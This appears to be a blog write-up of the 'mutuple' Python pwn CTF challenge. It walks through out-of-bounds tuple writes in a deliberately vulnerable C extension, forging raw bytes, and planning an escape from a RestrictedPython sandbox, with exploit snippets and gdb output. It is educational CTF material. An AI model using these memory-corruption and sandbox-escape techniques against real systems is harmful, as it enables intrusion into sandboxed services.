@@ -1,0 +1,382 @@
+<p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=yuXaABIr0go&amp;list=PL8Xbf2xl0OGBgCZw4kyzpulGkXN1f0ZQM&amp;index=9"> 明日にはすべてが終わるとして</a> by kinokoteikoku.</p>
+
+<p><img src="https://i.imgur.com/JIUaiNl.png" alt="image" /></p>
+
+<p><a href="https://blog.azazo.me">azazo</a> and i did this ctf alongside one other friend. the event is long gone now but i decided to upsolve this python pwn challenge by <a href="https://samuzora.com">samuzora</a> that i thought was really fun. it took me about 8 hours.</p>
+
+<h3 id="pwnmutuple">pwn/mutuple</h3>
+
+<blockquote>
+  <p>I made tuples mutable… you can call them mutuples ecks dee</p>
+
+  <p>by samuzora</p>
+
+  <p>0 solves</p>
+</blockquote>
+
+<p>wah 0 solves fucking kena this one</p>
+
+<p>the challenge introduces a custom <code class="language-plaintext highlighter-rouge">mutuple</code> library with an <code class="language-plaintext highlighter-rouge">append</code> function.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define PY_SSIZE_T_CLEAN
+#include</span> <span class="cpf">&lt;python3.9/Python.h&gt;</span><span class="cp">
+</span>
+<span class="n">PyObject</span> <span class="o">*</span><span class="nf">PyInit_mutuple</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+
+<span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span><span class="nf">method_append</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="p">);</span>
+
+<span class="n">PyMethodDef</span> <span class="n">methods</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> 
+  <span class="p">{</span>
+    <span class="p">.</span><span class="n">ml_name</span> <span class="o">=</span> <span class="s">"append"</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">ml_meth</span> <span class="o">=</span> <span class="n">method_append</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">ml_flags</span> <span class="o">=</span> <span class="n">METH_VARARGS</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="n">PyModuleDef</span> <span class="n">definition</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="p">.</span><span class="n">m_name</span> <span class="o">=</span> <span class="s">"mutuple"</span><span class="p">,</span>
+  <span class="p">.</span><span class="n">m_methods</span> <span class="o">=</span> <span class="n">methods</span><span class="p">,</span>
+<span class="p">};</span>
+
+<span class="n">PyObject</span> <span class="o">*</span><span class="nf">PyInit_mutuple</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">PyModule_Create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">definition</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span><span class="nf">method_append</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">self</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">PyTupleObject</span> <span class="o">*</span><span class="n">the_tuple</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="n">PyObject</span> <span class="o">*</span><span class="n">to_add</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PyArg_UnpackTuple</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="s">"ref"</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">the_tuple</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">to_add</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">PyTuple_Check</span><span class="p">(</span><span class="n">the_tuple</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">PyErr_SetString</span><span class="p">(</span><span class="n">PyExc_TypeError</span><span class="p">,</span> <span class="s">"first argument must be of type tuple"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">the_tuple</span><span class="o">-&gt;</span><span class="n">ob_item</span><span class="p">[</span><span class="n">the_tuple</span><span class="o">-&gt;</span><span class="n">ob_base</span><span class="p">.</span><span class="n">ob_size</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">to_add</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="n">Py_True</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="setup">setup</h3>
+
+<p>getting this setup on your local machine is actually nontrivial, esp. if you want debug symbols on python (which are super nice to have due to the struct definitions being given for you). consulting the Dockerfile we can see that it’s python 3.9, so let’s get python 3.9 and compile it with debug symbols. the process for this is shown in my <a href="https://slight-smile.com/writeups/infobahn-ctf-25/">rev/disthis writeup</a> over on the slight-smile website (check us out ^_^) so i won’t belabor the point.</p>
+
+<p>the key thing you’ll want to do is copy the provided compiled library (with debug symbols also, bless u lucas) into the correct directory, in this case it’s <code class="language-plaintext highlighter-rouge">/Python-3.9.0/build/lib.linux-x86_64-3.9-pydebug</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>.linux-x86_64-3.9-pydebug<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">ls
+</span>array.cpython-39d-x86_64-linux-gnu.so             _opcode.cpython-39d-x86_64-linux-gnu.so
+_asyncio.cpython-39d-x86_64-linux-gnu.so          ossaudiodev.cpython-39d-x86_64-linux-gnu.so
+audioop.cpython-39d-x86_64-linux-gnu.so           parser.cpython-39d-x86_64-linux-gnu.so
+binascii.cpython-39d-x86_64-linux-gnu.so          _pickle.cpython-39d-x86_64-linux-gnu.so
+_bisect.cpython-39d-x86_64-linux-gnu.so           _posixshmem.cpython-39d-x86_64-linux-gnu.so
+_blake2.cpython-39d-x86_64-linux-gnu.so           _posixsubprocess.cpython-39d-x86_64-linux-gnu.so
+</code></pre></div></div>
+
+<p>this is where all the library nonsense lies. we can verify that the library is installed by calling <code class="language-plaintext highlighter-rouge">from mutuple import *</code>, here is me demoing the functionality.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">mutuple</span> <span class="kn">import</span> <span class="n">append</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">append</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="bp">True</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span>
+<span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>lovely let’s get on with the solve</p>
+
+<h3 id="primitive-oob-write-of-pointers">primitive: oob write of pointers</h3>
+
+<p>to be honest i didn’t actually dig too deep into the source code itself, i just kept whacking in gdb until i got a crash. but to explain the functionality, there’s no quote-unquote ‘bounds’ check as to the allocated area dedicated for the tuple, so if we keep appending to the given tuple, we’ll inevitably overwrite some adjacent tuples.</p>
+
+<p>a major problem and annoyance w/ python pwn is that python seems to allocate objects wherever the fuck it feels like, thus making offsets wildly inconsistent. you can have a working solve script that relies on a baked-in offset, keep making edits to it, and then it completely whacks up the offset. we circumvent this by allocating a bunch of tuples, checking the offsets of adjacent items in memory, and just hoping we get a nice number. here is some code that does exactly that, we just spray and pray and hope for two tuples at offset <code class="language-plaintext highlighter-rouge">0x50</code> from one another.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vals</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">vm</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">print_</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
+    <span class="n">vals</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span><span class="p">,))</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">id</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="mh">0x50</span><span class="p">:</span>
+            <span class="n">offset</span> <span class="o">=</span> <span class="n">i</span><span class="o">-</span><span class="mi">1</span>
+            <span class="k">break</span>
+
+<span class="n">vm</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">])</span>
+<span class="n">vm</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'...'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>at this point in the challenge it behooves us to learn a bit more about the <code class="language-plaintext highlighter-rouge">PyTupleObject</code> struct as defined in <code class="language-plaintext highlighter-rouge">CPython</code>. lucas samuzora tan has a really good deep-dive into this on his author writeup for the challenge so i won’t belabor the point, i’ll just go over what is strictly necessary to solve the challenge. we’ll get the address of one of our tuples and poke around in it in gdb.</p>
+
+<p>again, note that compiling with symbols is <em>really</em> nice because we can automatically resolve all these type definitions and struct formats.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">PyTupleObject</span><span class="o">*</span><span class="p">)</span><span class="mh">0x7ffff755ce10</span>
+<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">ob_refcnt</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">,</span>
+      <span class="n">ob_type</span> <span class="o">=</span> <span class="mh">0x5555558fc020</span> <span class="o">&lt;</span><span class="n">PyTuple_Type</span><span class="o">&gt;</span>
+    <span class="p">},</span>
+    <span class="n">ob_size</span> <span class="o">=</span> <span class="mh">0x1</span>
+  <span class="p">},</span>
+  <span class="n">ob_item</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">[</span><span class="mh">0x0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x7ffff7cb6380</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>the important things here are <code class="language-plaintext highlighter-rouge">ob_size</code>, <code class="language-plaintext highlighter-rouge">ob_type</code>, and <code class="language-plaintext highlighter-rouge">ob_item</code>. <code class="language-plaintext highlighter-rouge">ob_size</code> is the number of items in the tuple, <code class="language-plaintext highlighter-rouge">ob_type</code> is a pointer to the <code class="language-plaintext highlighter-rouge">type</code> object in Python, and <code class="language-plaintext highlighter-rouge">ob_item</code> is an array containing pointers to everything in the tuple.</p>
+
+<p>viewing the raw bytes and eyepowering the structs we can see the two tuples, almost side-by-side:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">16</span><span class="n">x</span> <span class="mh">0x7ffff759f820</span>
+
+<span class="p">[</span><span class="n">here</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">first</span> <span class="nb">tuple</span><span class="p">]</span>
+<span class="mh">0x7ffff759f820</span><span class="p">:</span>	<span class="mh">0x0000000000000001</span>	<span class="mh">0x00005555558fc020</span>
+<span class="mh">0x7ffff759f830</span><span class="p">:</span>	<span class="mh">0x0000000000000001</span>	<span class="mh">0x00007ffff7cb3e40</span> <span class="o">&lt;-</span> <span class="p">[</span><span class="n">here</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">first</span> <span class="nb">object</span><span class="p">]</span>
+<span class="mh">0x7ffff759f840</span><span class="p">:</span>	<span class="mh">0xfdfdfdfdfdfdfdfd</span>	<span class="mh">0xdddddddddddddddd</span>
+
+<span class="p">[</span><span class="n">i</span> <span class="n">have</span> <span class="n">no</span> <span class="n">idea</span> <span class="n">what</span> <span class="n">this</span> <span class="n">nonsense</span> <span class="ow">is</span><span class="p">]</span>
+<span class="mh">0x7ffff759f850</span><span class="p">:</span>	<span class="mh">0x3000000000000000</span>	<span class="mh">0xfdfdfdfdfdfdfd6f</span>
+<span class="mh">0x7ffff759f860</span><span class="p">:</span>	<span class="mh">0x0000555555949fb0</span>	<span class="mh">0x00007ffff759f810</span>
+
+<span class="p">[</span><span class="n">here</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">second</span> <span class="nb">tuple</span><span class="p">]</span>
+<span class="mh">0x7ffff759f870</span><span class="p">:</span>	<span class="mh">0x0000000000000001</span>	<span class="mh">0x00005555558fc020</span>
+<span class="mh">0x7ffff759f880</span><span class="p">:</span>	<span class="mh">0x0000000000000001</span>	<span class="mh">0x00007ffff7cb3e80</span>
+<span class="mh">0x7ffff759f890</span><span class="p">:</span>	<span class="mh">0xfdfdfdfdfdfdfdfd</span>	<span class="mh">0xdddddddddddddddd</span>
+</code></pre></div></div>
+
+<p>the tuples are basically almost kissing. given that each <code class="language-plaintext highlighter-rouge">.append()</code> occupies one qword, we can eyepower and see we need to append 6 qwords to get through all the garbage, and then our next <code class="language-plaintext highlighter-rouge">.append()</code> would start impacting struct metadata. we whack once to impact <code class="language-plaintext highlighter-rouge">ob_refcnt</code>, then another time to whack <code class="language-plaintext highlighter-rouge">ob_type</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'rawr'</span><span class="p">)</span>
+
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'woof'</span><span class="p">)</span> <span class="c1"># &lt;- now we whack the ob_refcnt, which doesnt do much
+</span><span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'meow'</span><span class="p">)</span> <span class="c1"># &lt;- this one kena whack the ob_type
+</span>
+<span class="n">print_</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]))</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'...'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>running this, we’ll see that our <code class="language-plaintext highlighter-rouge">type</code> for the second tuple is now altered.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>starting the exploit...
+0x7ff988963be0
+0x7ff988963c30
+tuple <span class="nb">type</span> <span class="o">&gt;</span>  meow
+</code></pre></div></div>
+
+<p>epic. an important caveat of this write is that we are currently unable to write arbitrary bytes, just pointers to objects. say, if we wanted to write nulls to some fields, we just couldn’t, because no Python function is able to return a nullptr without erroring out.</p>
+
+<p>so what do we do? given that we can still whack <code class="language-plaintext highlighter-rouge">ob_size</code>, we can create a tuple that’s just, really fucking big:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'rawr'</span><span class="p">)</span>
+
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'woof'</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">tuple</span><span class="p">)</span> <span class="c1"># &lt;- we actually don't want to alter our struct's type here
+</span><span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'meow'</span><span class="p">)</span> <span class="c1"># &lt;- this whacks the ob_size
+</span>
+<span class="n">vuln</span> <span class="o">=</span> <span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'tuple type &gt; '</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="n">vuln</span><span class="p">))</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'tuple size &gt; '</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">vuln</span><span class="p">))</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'...'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>a neat hack here is that if we want to get to <code class="language-plaintext highlighter-rouge">ob_size</code>, we’ll naturally have to whack <code class="language-plaintext highlighter-rouge">ob_type</code>. we don’t actually want to whack <code class="language-plaintext highlighter-rouge">ob_type</code>! but since we’re able to write <em>pointers</em>, we have access to the <code class="language-plaintext highlighter-rouge">tuple</code> pointer by directly writing <code class="language-plaintext highlighter-rouge">tuple</code>.</p>
+
+<p>this results in our huge tuple.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>ves/pwn-mutuple/src/chall<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">cp </span>fuzz.py /tmp/fuzz.py<span class="p">;</span> ./python run.py fuzz.py
+starting the exploit...
+0x7f3ccf0b0190
+0x7f3ccf0b01e0
+tuple <span class="nb">type</span> <span class="o">&gt;</span>  &lt;class <span class="s1">'tuple'</span><span class="o">&gt;</span>
+tuple size <span class="o">&gt;</span>  139899148097392
+</code></pre></div></div>
+
+<p>this is OOB read. the thing is, we still can’t read raw bytes, because when we index into the tuple, it dereferences the pointer at that index of the <code class="language-plaintext highlighter-rouge">ob_item</code> array - it doesn’t actually return the bytes themselves.</p>
+
+<p>the question then becomes: how do we <em>forge</em> bytes? in other python pwn a really handy tool is <code class="language-plaintext highlighter-rouge">bytearray</code>, but the challenge does not give us access to this :(</p>
+
+<p>instead we can just write bytes, with, well, <code class="language-plaintext highlighter-rouge">bytes</code>. the <code class="language-plaintext highlighter-rouge">bytes</code> object actually does contain the raw bytes written to it as a contiguous section in one of its struct fields. let’s demonstrate by creating a <code class="language-plaintext highlighter-rouge">bytes</code> object and analysing it.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">b</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'rawr rawr woof'</span>
+<span class="n">print_</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">b</span><span class="p">)))</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'...'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>hopping into gef:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">PyBytesObject</span><span class="o">*</span><span class="p">)</span><span class="mh">0x7ffff755c8b0</span>
+<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">ob_refcnt</span> <span class="o">=</span> <span class="mh">0x2</span><span class="p">,</span>
+      <span class="n">ob_type</span> <span class="o">=</span> <span class="mh">0x5555558ed400</span> <span class="o">&lt;</span><span class="n">PyBytes_Type</span><span class="o">&gt;</span>
+    <span class="p">},</span>
+    <span class="n">ob_size</span> <span class="o">=</span> <span class="mh">0xe</span>
+  <span class="p">},</span>
+  <span class="n">ob_shash</span> <span class="o">=</span> <span class="mh">0xb57bd7371431d8f2</span><span class="p">,</span>
+  <span class="n">ob_sval</span> <span class="o">=</span> <span class="s">"r"</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>the <code class="language-plaintext highlighter-rouge">ob_sval</code> field is what we want here. we can print this as a string and verify the bytes are there.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">g</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PyBytesObject</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x7ffff755c900</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ob_sval</span>
+<span class="mh">0x7ffff755c920</span><span class="p">:</span>	<span class="mh">0x7761722072776172</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PyBytesObject</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x7ffff755c900</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ob_sval</span>
+<span class="mh">0x7ffff755c920</span><span class="p">:</span>	<span class="s">"rawr rawr woof"</span>
+</code></pre></div></div>
+
+<p>so this becomes our handy primitive to create raw bytes. we’ll use this to forge pointers to objects in the Python namespace - because we now have a really large tuple, as long as our forged tuple is <em>before</em> our forged bytes object in memory, we can just access it by indexing into the tuple.</p>
+
+<p>we will have to figure out something nice to forge. let’s actually look at the set-up for the challenge (it accepts a base64 encoded .py file and runs it with severe restrictions &gt; )</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3.9 -u
+</span><span class="kn">from</span> <span class="nn">mutuple</span> <span class="kn">import</span> <span class="n">append</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">modules</span><span class="p">,</span> <span class="n">argv</span>
+<span class="k">del</span> <span class="n">modules</span><span class="p">[</span><span class="s">'os'</span><span class="p">]</span>
+<span class="n">keys</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">__builtins__</span><span class="p">.</span><span class="n">__dict__</span><span class="p">.</span><span class="n">keys</span><span class="p">())</span>
+
+<span class="kn">from</span> <span class="nn">RestrictedPython</span> <span class="kn">import</span> <span class="n">compile_restricted</span><span class="p">,</span> <span class="n">safe_builtins</span>
+<span class="kn">from</span> <span class="nn">RestrictedPython.Eval</span> <span class="kn">import</span> <span class="n">default_guarded_getiter</span>
+<span class="kn">from</span> <span class="nn">RestrictedPython.Guards</span> <span class="kn">import</span> <span class="n">full_write_guard</span>
+
+<span class="kn">from</span> <span class="nn">operator</span> <span class="kn">import</span> <span class="n">getitem</span>
+
+<span class="k">def</span> <span class="nf">_inplacevar_</span><span class="p">(</span><span class="n">op</span><span class="p">,</span> <span class="n">var</span><span class="p">,</span> <span class="n">expr</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"+="</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">var</span> <span class="o">+</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"-="</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">var</span> <span class="o">-</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"*="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">*</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"/="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">/</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"%="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">%</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"**="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">**</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"&lt;&lt;="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">&lt;&lt;</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"&gt;&gt;="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">&gt;&gt;</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"|="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">|</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"^="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">^</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"&amp;="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">&amp;</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"//="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">//</span> <span class="n">expr</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="s">"@="</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">var</span> <span class="o">//</span> <span class="n">expr</span>
+
+<span class="n">filename</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s">"/tmp/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+    <span class="n">builtins</span> <span class="o">=</span> <span class="n">safe_builtins</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"_getitem_"</span><span class="p">]</span> <span class="o">=</span> <span class="n">getitem</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"_getiter_"</span><span class="p">]</span> <span class="o">=</span> <span class="n">default_guarded_getiter</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"_inplacevar_"</span><span class="p">]</span> <span class="o">=</span> <span class="n">_inplacevar_</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"_write_"</span><span class="p">]</span> <span class="o">=</span> <span class="n">full_write_guard</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"bytes"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bytes</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"chr"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"input"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">input</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"append"</span><span class="p">]</span> <span class="o">=</span> <span class="n">append</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"ord"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"print_"</span><span class="p">]</span> <span class="o">=</span> <span class="k">print</span> <span class="c1"># allow printing in sandbox
+</span>    <span class="n">builtins</span><span class="p">[</span><span class="s">"type"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">type</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'starting the exploit...'</span><span class="p">)</span>
+    <span class="k">exec</span><span class="p">(</span>
+        <span class="n">compile_restricted</span><span class="p">(</span><span class="nb">file</span><span class="p">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">filename</span><span class="o">=</span><span class="s">"&lt;inline-code&gt;"</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s">"exec"</span><span class="p">),</span>
+        <span class="p">{</span><span class="s">"__builtins__"</span><span class="p">:</span> <span class="n">builtins</span><span class="p">},</span>
+        <span class="bp">None</span>
+    <span class="p">)</span>
+</code></pre></div></div>
+
+<p>this specifically gates access to python’s <code class="language-plaintext highlighter-rouge">builtins</code> and replaces it with a safer version. the thing is though, this <code class="language-plaintext highlighter-rouge">builtins</code> module <em>still exists</em> in the memory, and we can find, reference, and forge a pointer to this module.</p>
+
+<p>of course, we cannot directly reference it by calling <code class="language-plaintext highlighter-rouge">id()</code>, but since it’s defined in the python heap somewhere (I Think), we can work off the assumption that it’s a fixed offset other objects, and just subtract and add accordingly - this is similar to how actual C pwn works, of course (finding libc addresses, so on so forth).</p>
+
